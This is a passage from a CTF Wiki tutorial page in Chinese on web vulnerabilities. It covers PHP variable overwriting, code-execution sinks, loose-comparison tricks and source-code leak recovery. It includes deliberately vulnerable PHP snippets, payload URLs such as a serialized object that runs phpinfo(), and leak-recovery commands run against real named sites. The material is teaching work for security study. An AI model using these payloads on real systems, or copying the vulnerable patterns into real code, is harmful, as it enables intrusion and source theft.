</pre></div>

</li>
<li>
<p>其他方式</p>
<p>后缀大小写、双写、特殊后缀如 <code>php5</code> 等，修改包内容的大小写过 WAF 等。</p>
</li>
</ul>
<h2 id="_6">变量覆盖<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
<h3 id="_7">全局变量覆盖<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
<p>变量如果未被初始化，且能够用户所控制，那么很可能会导致安全问题。</p>
<div class="codehilite"><pre><span></span><span class="na">register_globals</span><span class="o">=</span><span class="s">ON</span>
</pre></div>

<p>示例</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">echo</span> <span class="s2">&quot;Register_globals: &quot;</span> <span class="o">.</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;register_globals&quot;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&lt;br/&gt;&quot;</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$auth</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">&quot;private!&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>当 <code>register_globals=ON</code> 时，提交 <code>test.php?auth=1</code>，<code>auth</code> 变量将自动得到赋值。</p>
<h3 id="extract"><code>extract()</code> 变量覆盖<a class="headerlink" href="#extract" title="Permanent link">&para;</a></h3>
<p><code>extract()</code> 函数能够将变量从数组导入到当前的符号表，其定义为</p>
<div class="codehilite"><pre><span></span>int extract ( array $var_array [, int $extract_type [, string $prefix ]] )
</pre></div>

<p>其中，第二个参数指定函数将变量导入符号表时的行为，最常见的两个值是 <code>EXTR_OVERWRITE</code> 和 <code>EXTR_SKIP</code>。</p>
<p>当值为 <code>EXTR_OVERWRITE</code> 时，在将变量导入符号表的过程中，如果变量名发生冲突，则覆盖所有变量；值为 <code>EXTR_SKIP</code> 则表示跳过不覆盖。若第二个参数未指定，则在默认情况下使用 <code>EXTR_OVERWRITE</code>。</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$auth</span> <span class="o">=</span> <span class="s2">&quot;0&quot;</span><span class="p">;</span>
<span class="nb">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$auth</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">&quot;private!&quot;</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">&quot;public!&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>当 <code>extract()</code> 函数从用户可以控制的数组中导出变量时，可能发生变量覆盖。</p>
<h3 id="import_request_variables"><code>import_request_variables</code> 变量覆盖<a class="headerlink" href="#import_request_variables" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span>bool import_request_variables (string $types [, string $prefix])
</pre></div>

<p><code>import_request_variables</code> 将 GET、POST、Cookies 中的变量导入到全局，使用这个函数只用简单地指定类型即可。</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$auth</span> <span class="o">=</span> <span class="s2">&quot;0&quot;</span><span class="p">;</span>
<span class="nb">import_request_variables</span><span class="p">(</span><span class="s2">&quot;G&quot;</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$auth</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">&quot;private!&quot;</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">&quot;public!&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p><code>import_request_variables(&quot;G&quot;)</code> 指定导入 GET 请求中的变量，提交 <code>test.php?auth=1</code> 出现变量覆盖。</p>
<h3 id="parse_str"><code>parse_str()</code> 变量覆盖<a class="headerlink" href="#parse_str" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span>void parse_str ( string $str [, array &amp;$arr ])
</pre></div>

<p><code>parse_str()</code> 函数通常用于解析 URL 中的 querystring，但是当参数值可以被用户控制时，很可能导致变量覆盖。</p>
<div class="codehilite"><pre><span></span><span class="x">// var.php?var=new  变量覆盖</span>
<span class="x">$var = &quot;init&quot;;</span>
<span class="x">parse_str($_SERVER[&quot;QUERY_STRING&quot;]);</span>
<span class="x">print $var;</span>
</pre></div>

<p>与 <code>parse_str()</code> 类似的函数还有 <code>mb_parse_str()</code>。</p>
<h2 id="_8">命令执行<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
<h3 id="_9">直接执行代码<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
<p>PHP 中有不少可以直接执行代码的函数。</p>
<div class="codehilite"><pre><span></span><span class="x">eval();</span>
<span class="x">assert();</span>
<span class="x">system();</span>
<span class="x">exec();</span>
<span class="x">shell_exec();</span>
<span class="x">passthru();</span>
<span class="x">escapeshellcmd();</span>
<span class="x">pcntl_exec();</span>
<span class="x">......</span>
</pre></div>

<h3 id="preg_replace"><code>preg_replace()</code> 代码执行<a class="headerlink" href="#preg_replace" title="Permanent link">&para;</a></h3>
<p><code>preg_replace()</code> 的第一个参数如果存在 <code>/e</code> 模式修饰符，则允许代码执行。</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$var</span> <span class="o">=</span> <span class="s2">&quot;&lt;tag&gt;phpinfo()&lt;/tag&gt;&quot;</span><span class="p">;</span>
<span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/&lt;tag&gt;(.*?)&lt;\/tag&gt;/e&quot;</span><span class="p">,</span> <span class="s2">&quot;addslashes(</span><span class="se">\\</span><span class="s2">1)&quot;</span><span class="p">,</span> <span class="nv">$var</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>如果没有 <code>/e</code> 修饰符，可以尝试 %00 截断。</p>
<h3 id="_10">动态函数执行<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
<p>用户自定义的函数可以导致代码执行。</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$dyn_func</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;dyn_func&quot;</span><span class="p">];</span>
<span class="nv">$argument</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;argument&quot;</span><span class="p">];</span>
<span class="nv">$dyn_func</span><span class="p">(</span><span class="nv">$argument</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<h3 id="_11">反引号命令执行<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">echo</span> <span class="sb">`ls -al`</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<h3 id="curly-syntax">Curly Syntax<a class="headerlink" href="#curly-syntax" title="Permanent link">&para;</a></h3>
<p>PHP 的 Curly Syntax 也能导致代码执行，它将执行花括号间的代码，并将结果替换回去。</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$var</span> <span class="o">=</span> <span class="s2">&quot;aaabbbccc </span><span class="si">${</span><span class="nv">`ls`</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$foobar</span> <span class="o">=</span> <span class="s2">&quot;phpinfo&quot;</span><span class="p">;</span>
<span class="err">$</span><span class="p">{</span><span class="s2">&quot;foobar&quot;</span><span class="p">}();</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<h3 id="_12">回调函数<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
<p>很多函数都可以执行回调函数，当回调函数用户可控时，将导致代码执行。</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$evil_callback</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;callback&quot;</span><span class="p">];</span>
<span class="nv">$some_array</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
<span class="nv">$new_array</span> <span class="o">=</span> <span class="nb">array_map</span><span class="p">(</span><span class="nv">$evil_callback</span><span class="p">,</span> <span class="nv">$some_array</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>攻击 payload</p>
<div class="codehilite"><pre><span></span>http://www.a.com/index.php?callback=phpinfo
</pre></div>

<h3 id="_13">反序列化<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
<p>如果 <code>unserialize()</code> 在执行时定义了 <code>__destruct()</code> 或 <code>__wakeup()</code> 函数，则有可能导致代码执行。</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">class</span> <span class="nc">Example</span> <span class="p">{</span>
  <span class="k">var</span> <span class="nv">$var</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
  <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$var</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;saved_code&quot;</span><span class="p">]);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>攻击 payload</p>
<div class="codehilite"><pre><span></span>http://www.a.com/index.php?saved_code=O:7:&quot;Example&quot;:1:{s:3:&quot;var&quot;;s:10:&quot;phpinfo();&quot;;}
</pre></div>

<h2 id="php">PHP 特性<a class="headerlink" href="#php" title="Permanent link">&para;</a></h2>
<h3 id="_14">数组<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$var</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="nv">$var</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="nv">$var</span> <span class="o">=</span> <span class="s2">&quot;string&quot;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>php 不会严格检验传入的变量类型，也可以将变量自由的转换类型。</p>
<p>比如在 <code>$a == $b</code> 的比较中</p>
<div class="codehilite"><pre><span></span><span class="x">$a = null; </span>
<span class="x">$b = false; //为真 </span>
<span class="x">$a = &#39;&#39;; </span>
<span class="x">$b = 0; //同样为真</span>
</pre></div>

<p>然而，PHP 内核的开发者原本是想让程序员借由这种不需要声明的体系，更加高效的开发，所以在几乎所有内置函数以及基本结构中使用了很多松散的比较和转换，防止程序中的变量因为程序员的不规范而频繁的报错，然而这却带来了安全问题。</p>
<div class="codehilite"><pre><span></span><span class="x">0==&#39;0&#39; //true</span>
<span class="x">0 == &#39;abcdefg&#39; //true</span>
<span class="x">0 === &#39;abcdefg&#39; //false</span>
<span class="x">1 == &#39;1abcdef&#39; //true</span>
</pre></div>

<h3 id="hash">魔法 Hash<a class="headerlink" href="#hash" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="x">&quot;0e132456789&quot;==&quot;0e7124511451155&quot; //true</span>
<span class="x">&quot;0e123456abc&quot;==&quot;0e1dddada&quot; //false</span>
<span class="x">&quot;0e1abc&quot;==&quot;0&quot;  //true</span>
</pre></div>

<p>在进行比较运算时，如果遇到了 <code>0e\d+</code> 这种字符串，就会将这种字符串解析为科学计数法。所以上面例子中 2 个数的值都是 0 因而就相等了。如果不满足 <code>0e\d+</code> 这种模式就不会相等。</p>
<h3 id="_15">十六进制转换<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="x">&quot;0x1e240&quot;==&quot;123456&quot; //true</span>
<span class="x">&quot;0x1e240&quot;==123456 //true</span>
<span class="x">&quot;0x1e240&quot;==&quot;1e240&quot; //false</span>
</pre></div>

<p>当其中的一个字符串是 <code>0x</code> 开头的时候，PHP 会将此字符串解析成为十进制然后再进行比较，<code>0x1240</code> 解析成为十进制就是 123456，所以与 <code>int</code> 类型和 <code>string</code> 类型的 123456 比较都是相等。</p>
<h3 id="_16">类型转换<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h3>
<p>常见的转换主要就是 <code>int</code> 转换为 <code>string</code>，<code>string</code> 转换为 <code>int</code>。</p>
<p><code>int</code> 转 <code>string</code></p>
<div class="codehilite"><pre><span></span><span class="x">$var = 5;</span>
<span class="x">方式1：$item = (string)$var;</span>
<span class="x">方式2：$item = strval($var);</span>
</pre></div>

<p><code>string</code> 转 <code>int</code>：<code>intval()</code> 函数。</p>
<p>对于这个函数，可以先看 2 个例子。</p>
<div class="codehilite"><pre><span></span><span class="x">var_dump(intval(&#39;2&#39;)) //2</span>
<span class="x">var_dump(intval(&#39;3abcd&#39;)) //3</span>
<span class="x">var_dump(intval(&#39;abcd&#39;)) //0</span>
</pre></div>

<p>说明 <code>intval()</code> 转换的时候，会将从字符串的开始进行转换知道遇到一个非数字的字符。即使出现无法转换的字符串， <code>intval()</code> 不会报错而是返回 0。</p>
<p>同时，程序员在编程的时候也不应该使用如下的这段代码：</p>
<div class="codehilite"><pre><span></span><span class="x">if(intval($a)&gt;1000) {</span>
<span class="x"> mysql_query(&quot;select * from news where id=&quot;.$a)</span>
<span class="x">}</span>
</pre></div>

<p>这个时候 <code>$a</code> 的值有可能是 <code>1002 union</code>。</p>
<h3 id="_17">内置函数的参数的松散性<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h3>
<p>内置函数的松散性说的是，调用函数时给函数传递函数无法接受的参数类型。解释起来有点拗口，还是直接通过实际的例子来说明问题，下面会重点介绍几个这种函数。</p>
<p><strong>md5()</strong></p>
<div class="codehilite"><pre><span></span><span class="x">$array1[] = array(</span>
<span class="x"> &quot;foo&quot; =&gt; &quot;bar&quot;,</span>
<span class="x"> &quot;bar&quot; =&gt; &quot;foo&quot;,</span>
<span class="x">);</span>
<span class="x">$array2 = array(&quot;foo&quot;, &quot;bar&quot;, &quot;hello&quot;, &quot;world&quot;);</span>
<span class="x">var_dump(md5($array1)==var_dump($array2)); //true</span>
</pre></div>

<p>PHP 手册中的 md5（）函数的描述是 <code>string md5 ( string $str [, bool $raw_output = false ] )</code>，<code>md5()</code> 中的需要是一个 string 类型的参数。但是当你传递一个 array 时，<code>md5()</code> 不会报错，只是会无法正确地求出 array 的 md5 值，这样就会导致任意 2 个 array 的 md5 值都会相等。</p>
<p><strong>strcmp()</strong></p>
<p><code>strcmp()</code> 函数在 PHP 官方手册中的描述是 <code>intstrcmp ( string $str1 ， string $str2 )</code>，需要给 <code>strcmp()</code> 传递 2 个 <code>string</code> 类型的参数。如果 <code>str1</code> 小于 <code>str2</code>，返回 -1，相等返回 0，否则返回 1。<code>strcmp()</code> 函数比较字符串的本质是将两个变量转换为 ASCII，然后进行减法运算，然后根据运算结果来决定返回值。</p>
<p>如果传入给出 <code>strcmp()</code> 的参数是数字呢？</p>
<div class="codehilite"><pre><span></span><span class="x">$array=[1,2,3];</span>
<span class="x">var_dump(strcmp($array,&#39;123&#39;)); //null,在某种意义上null也就是相当于false。</span>
</pre></div>

<p><strong>switch()</strong></p>
<p>如果 <code>switch()</code> 是数字类型的 case 的判断时，switch 会将其中的参数转换为 int 类型。如下：</p>
<div class="codehilite"><pre><span></span><span class="x">$i =&quot;2abc&quot;;</span>
<span class="x">switch ($i) {</span>
<span class="x">case 0:</span>
<span class="x">case 1:</span>
<span class="x">case 2:</span>
<span class="x"> echo &quot;i is less than 3 but not negative&quot;;</span>
<span class="x"> break;</span>
<span class="x">case 3:</span>
<span class="x"> echo &quot;i is 3&quot;;</span>
<span class="x">}</span>
</pre></div>

<p>这个时候程序输出的是 <code>i is less than 3 but not negative</code> ，是由于 <code>switch()</code> 函数将 <code>$i</code> 进行了类型转换，转换结果为 2。</p>
<p><strong>in_array()</strong></p>
<p>在 PHP 手册中， <code>in_array()</code> 函数的解释是 <code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code> ,如果strict参数没有提供，那么in_array就会使用松散比较来判断 <code>$needle</code> 是否在 <code>$haystack</code> 中。当 strince 的值为 true 时， <code>in_array()</code> 会比较 needls 的类型和 haystack 中的类型是否相同。</p>
<div class="codehilite"><pre><span></span><span class="x">$array=[0,1,2,&#39;3&#39;];</span>
<span class="x">var_dump(in_array(&#39;abc&#39;, $array)); //true</span>
<span class="x">var_dump(in_array(&#39;1bc&#39;, $array)); //true</span>
</pre></div>

<p>可以看到上面的情况返回的都是 true，因为 <code>'abc'</code> 会转换为 0， <code>'1bc'</code> 转换为 1。</p>
<p><code>array_search()</code> 与 <code>in_array()</code> 也是一样的问题。</p>
<h2 id="_18">寻找源代码备份<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h2>
<h3 id="hg">hg 源码泄露<a class="headerlink" href="#hg" title="Permanent link">&para;</a></h3>
<p><code>hg init</code> 时会产生 <code>.hg</code> 文件。</p>
<p><a href="https://github.com/kost/dvcs-ripper">利用工具 dvcs-ripper</a></p>
<h3 id="git">Git 源码泄露<a class="headerlink" href="#git" title="Permanent link">&para;</a></h3>
<p><code>.git</code> 目录内有代码的变更记录等文件，如果部署时该目录下的文件可被访问，可能会被利用来恢复源代码。</p>
<div class="codehilite"><pre><span></span>/.git
/.git/HEAD
/.git/index
/.git/config
/.git/description
</pre></div>

<p><a href="https://github.com/lijiejie/GitHack">GitHack</a></p>
<div class="codehilite"><pre><span></span>python GitHack.py http://www.openssl.org/.git/
</pre></div>

<p><a href="https://github.com/WangYihang/GitHacker">GitHacker（可恢复完整 Git 仓库）</a></p>
<div class="codehilite"><pre><span></span>python GitHacker.py http://www.openssl.org/.git/
</pre></div>

<h3 id="ds_store"><code>.DS_Store</code> 文件泄露<a class="headerlink" href="#ds_store" title="Permanent link">&para;</a></h3>
<p>Mac OS 中会包含有 <code>.DS_Store</code> 文件，包含文件名等信息。</p>
<p><a href="https://github.com/lijiejie/ds_store_exp">利用工具 ds＿store＿exp</a></p>
<div class="codehilite"><pre><span></span>python ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store

hd.zj.qq.com/
└── themes
    └── galaxyw
        ├── app
        │   └── css
        │       └── style.min.css
        ├── cityData.min.js
        ├── images
        │   └── img
        │       ├── bg-hd.png
        │       ├── bg-item-activity.png
        │       ├── bg-masker-pop.png
        │       ├── btn-bm.png
        │       ├── btn-login-qq.png
        │       ├── btn-login-wx.png
        │       ├── ico-add-pic.png
        │       ├── ico-address.png
        │       ├── ico-bm.png
        │       ├── ico-duration-time.png
        │       ├── ico-pop-close.png
        │       ├── ico-right-top-delete.png
        │       ├── page-login-hd.png
        │       ├── pic-masker.png
        │       └── ticket-selected.png
        └── member
            ├── assets
            │   ├── css
            │   │   ├── ace-reset.css
            │   │   └── antd.css
            │   └── lib
            │       ├── cityData.min.js
            │       └── ueditor
            │           ├── index.html
            │           ├── lang
            │           │   └── zh-cn
            │           │       ├── images
            │           │       │   ├── copy.png
            │           │       │   ├── localimage.png
            │           │       │   ├── music.png
            │           │       │   └── upload.png
            │           │       └── zh-cn.js
            │           ├── php
            │           │   ├── action_crawler.php
            │           │   ├── action_list.php
            │           │   ├── action_upload.php
            │           │   ├── config.json
            │           │   ├── controller.php
            │           │   └── Uploader.class.php
            │           ├── ueditor.all.js
            │           ├── ueditor.all.min.js
            │           ├── ueditor.config.js
            │           ├── ueditor.parse.js
            │           └── ueditor.parse.min.js
            └── static
                ├── css
                │   └── page.css
                ├── img
                │   ├── bg-table-title.png
                │   ├── bg-tab-say.png
                │   ├── ico-black-disabled.png
                │   ├── ico-black-enabled.png
                │   ├── ico-coorption-person.png
                │   ├── ico-miss-person.png
                │   ├── ico-mr-person.png
                │   ├── ico-white-disabled.png
                │   └── ico-white-enabled.png
                └── scripts
                    ├── js
                    └── lib
                        └── jquery.min.js

<span class="m">21</span> directories, <span class="m">48</span> files
</pre></div>

<h3 id="_19">网站备份文件<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h3>
<p>管理员备份网站文件后错误地将备份放在 Web 目录下。</p>
<p>常见的后缀名：</p>
<div class="codehilite"><pre><span></span>.rar
.zip
.7z
.tar
.tar.gz
.bak
.txt
</pre></div>

<h3 id="svn">SVN 泄露<a class="headerlink" href="#svn" title="Permanent link">&para;</a></h3>
<p>敏感文件：</p>
<div class="codehilite"><pre><span></span>/.svn
/.svn/wc.db
/.svn/entries
</pre></div>

<p><a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p>
<div class="codehilite"><pre><span></span>perl rip-svn.pl -v -u http://www.example.com/.svn/
</pre></div>

<p><a href="http://tools.40huo.cn/#!web.md#源码泄露">Seay - SVN</a></p>
<h3 id="web-inf-webxml">WEB-INF / web.xml 泄露<a class="headerlink" href="#web-inf-webxml" title="Permanent link">&para;</a></h3>
<p>WEB-INF 是 Java Web 应用的安全目录，web.xml 中有文件的映射关系。</p>
<p>WEB-INF 主要包含一下文件或目录：</p>
<ul>
<li><code>/WEB-INF/web.xml</code> ：Web 应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li>
<li><code>/WEB-INF/classes/</code> ：含了站点所有用的 class 文件，包括 servlet class 和非 servlet class，他们不能包含在。jar 文件中。</li>
<li><code>/WEB-INF/lib/</code> ：存放 web 应用需要的各种 JAR 文件，放置仅在这个应用中要求使用的 jar 文件，如数据库驱动 jar 文件。</li>
<li><code>/WEB-INF/src/</code> ：源码目录，按照包名结构放置各个 java 文件。</li>
<li><code>/WEB-INF/database.properties</code> ：数据库配置文件。</li>
</ul>
<p>通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，在通过反编译 class 文件，得到网站源码。 一般情况，jsp 引擎默认都是禁止访问 WEB-INF 目录的，Nginx 配合 Tomcat 做均衡负载或集群等情况时，问题原因其实很简单，Nginx 不会去考虑配置其他类型引擎（Nginx 不是 jsp 引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改 Nginx 配置文件禁止访问 WEB-INF 目录就好了：</p>
<div class="codehilite"><pre><span></span><span class="k">location</span> <span class="p">~</span> <span class="sr">^/WEB-INF/*</span> <span class="p">{</span> <span class="kn">deny</span> <span class="s">all</span><span class="p">;</span> <span class="p">}</span> <span class="c1"># 或者return 404; 或者其他！</span>
</pre></div>

<h3 id="cvs">CVS 泄露<a class="headerlink" href="#cvs" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span>http://url/CVS/Root 返回根信息
http://url/CVS/Entries 返回所有文件的结构
</pre></div>

<p>取回源码</p>
<div class="codehilite"><pre><span></span>bk clone http://url/name dir
</pre></div>
                
                  
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../ssrf/" title="SSRF 服务端请求伪造" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  后退
                </span>
                SSRF 服务端请求伪造
              </span>
            </div>
          </a>
        
        
          <a href="../../reverse/introduction/" title="软件逆向工程简介" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  前进
                </span>
                软件逆向工程简介
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            Copyright &copy; 2016 - 2018 CTF Wiki Team
          </div>
        
        powered by
        <a href="http://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
        
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../assets/javascripts/application.b438e6c5.js"></script>
      
        
        
          
          <script src="../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
          
            
              
                <script src="../../assets/javascripts/lunr/tinyseg.js"></script>
              
              
                <script src="../../assets/javascripts/lunr/lunr.jp.js"></script>
              
            
          
          
        
      
      <script>app.initialize({version:"0.17.3",url:{base:"../.."}})</script>
      
        <script src="../../_static/js/extra.js"></script>
      
        <script src="https://cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
      
    
    
      
    
  </body>
</html>